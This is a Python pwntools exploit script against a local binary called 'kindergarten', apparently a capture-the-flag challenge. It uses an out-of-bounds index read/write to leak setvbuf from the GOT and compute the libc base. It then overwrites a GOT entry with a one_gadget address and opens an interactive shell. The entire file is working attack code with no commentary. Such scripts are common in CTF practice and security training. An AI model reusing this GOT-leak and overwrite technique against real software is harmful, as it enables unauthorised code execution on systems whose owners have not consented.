from pwn import *
import re

p=process("./kindergarten")
libc=p.libc
one_gadget_off=0x45216
array_addr=0x4080
print_got=0x4018

def read64(offset):
    buf = ''
    value = re.compile(r'the value at -?\d+ is (-?\d+)\. give me a new value:\n')
    for i in xrange(8):
        p.sendlineafter('give me an index:\n> ', str(offset + i))
        match = value.match(p.recvline())
        byte = int(match.group(1))
        p.sendline(str(byte))
        buf += p8(byte, signed=True)
    return u64(buf)
    
def write_to(offset, data):
    for i in xrange(len(data)):
        p.sendlineafter('give me an index:\n> ', str(offset + i))
        p.recvline()
        byte = u8(data[i], signed=True)
        p.sendline(str(byte))

setvbuf_off = libc.sym['setvbuf']

setvbuf = read64(-0x60)
libc_base = setvbuf - setvbuf_off
one_gadget = libc_base + one_gadget_off

write_to(-0x50, p64(one_gadget))
p.sendline('A')
p.clean()
p.interactive()
